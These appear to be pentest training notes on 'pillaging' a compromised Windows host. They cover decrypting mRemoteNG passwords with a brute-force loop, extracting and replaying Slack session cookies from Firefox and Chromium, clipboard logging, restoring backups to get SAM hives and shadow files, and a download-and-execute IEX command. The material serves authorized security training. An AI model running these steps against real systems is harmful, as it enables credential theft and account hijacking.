Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.

## Data Sources

Below are some of the sources from which we can obtain information from compromised systems:
- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

Let's assume that we have gained a foothold on the Windows server mentioned in the below network and start collecting as much information as possible.
![](https://academy.hackthebox.com/storage/modules/67/network.png)

---
### Installed Applications

Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest. It's important to know that every pentest is different. We may encounter a lot of unknown applications on the systems we compromised. Learning and understanding how these applications connect to the business are essential to achieving our goal.

```powershell
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

#### mRemoteNG

`mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.

```shell
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84..."
```

Attempting to decrypt the a password with a custom password will fail unless you specify the custom password used to encrypt it.

```powershell
 python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMo" -p admin
```

For loop bruteforce
```bash
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done 
```
---
### Abusing Cookies to Get Access to IM Clients
With the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like `Slack` and `Microsoft Teams` have become staples of modern office communications. These applications help in improving collaboration between co-workers and teams. If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.

There are multiple options to gain access to an IM Client; one standard method is to use the user's credentials to get into the cloud version of the instant messaging application as the regular user would.

If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.

 Multiple posts refer to how to abuse `Slack` such as [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). We can use them to understand better how Slack tokens and cookies work, but keep in mind that `Slack's` behavior may have changed since the release of those posts.

There's also a tool called [SlackExtract](https://github.com/clr2of8/SlackExtract) released in 2018, which was able to extract `Slack` messages. Their research discusses the cookie named `d`, which `Slack` uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.
##### Cookie Extraction from Firefox
Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.
```bash
adot8@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

Our target website is `slack.com`. Now that we have the cookie, we want to impersonate the user. Let's navigate to slack.com once the page loads, click on the icon for the Cookie-Editor extension, and modify the value of the `d` cookie with the value you have from the cookieextractor.py script. Make sure to click the save icon (marked in red in the image below).

![text](https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg)

Once you have saved the cookie, you can refresh the page and see that you are logged in as the user.

![text](https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg)

Now we are logged in as the user and can click on `Launch Slack`. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie `d` with the same value we used to gain access the first time on any website that asks us for information or credentials.

![text](https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg)

Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on `Launch Slack` and use Slack in the browser.

After gaining access, we can use built-in functions to search for common words like passwords, credentials, PII, or any other information relevant to our assessment.

![text](https://academy.hackthebox.com/storage/modules/67/search-creds-slack.jpg)

##### Cookie Extraction from Chromium-based Browsers

The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.

Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```
**IF YOU RECEIVE AN ERROR RUN THE FOLLOWING**
```powershell
 copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
---
### Clipboard
In many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms. As this doesn't involve `typing` the passwords, keystroke logging is not effective in this case. The `clipboard` provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.

```powershell
PS C:\htb> Invoke-ClipboardLogger
```
The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

---
#### Attacking Backup Servers

In information technology, a `backup` or `data backup` is a copy of computer data taken and stored elsewhere so that it may be used to restore the original after a data loss event. Backups can be used to recover data after a loss due to data deletion or corruption or to recover data from an earlier time. Backups provide a simple form of disaster recovery. Some backup systems can reconstitute a computer system or other complex configurations, such as an Active Directory server or database server.

Typically backup systems need an account to connect to the target machine and perform the backup. Most companies require that backup accounts have local administrative privileges on the target machine to access all its files and services.

If we gain access to a `backup system`, we may be able to review backups, search for interesting hosts and restore the data we want.

As we previously discussed, we are looking for information that can help us move laterally in the network or escalate our privileges. Let's use [restic](https://restic.net/) as an example. `Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

To start working with `restic`, we must create a `repository` (the directory where backups will be stored). `Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.

We will use `restic 0.13.1` and back up the repository `C:\xampp\htdocs\webapp` in `E:\restic\` directory. To download the latest version of restic, visit [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest). On our target machine, restic is located at `C:\Windows\System32\restic.exe`.

We first need to create and initialize the location where our backup will be saved, called the `repository`.

#### restic - Initialize Backup Directory

Pillaging

```powershell-session
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Then we can create our first backup.

#### restic - Back up a Directory

Pillaging

```powershell-session
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved
```

If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

#### restic - Back up a Directory with VSS

Pillaging

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read
```

**Note:** If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

We can also check which backups are saved in the repository using the `snapshot` command.

#### restic - Check Backups Saved in a Repository

Pillaging

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```

We can restore a backup using the ID.

#### restic - Restore a Backup with ID

Pillaging

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```

If we navigate to `C:\Restore`, we will find the directory structure where the backup was taken. To get to the `SampleFolder` directory, we need to navigate to `C:\Restore\C\SampleFolder`.

We need to understand our targets and what kind of information we are looking for. If we find a backup for a Linux machine, we may want to check files like `/etc/shadow` to crack users' credentials, web configuration files, `.ssh` directories to look for SSH keys, etc.

If we are targeting a Windows backup, we may want to look for the SAM & SYSTEM hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us achieve our goal.

Hundreds of applications and methods exist to perform backups, and we cannot detail each. This `restic` case is an example of how a backup application could work. Other systems will manage a centralized console and special repositories to save the backup information and execute the backup tasks.

As we move forward, we will find different backup systems, and we recommend taking the time to understand how they work so that we can eventually abuse their functions for our purpose.

---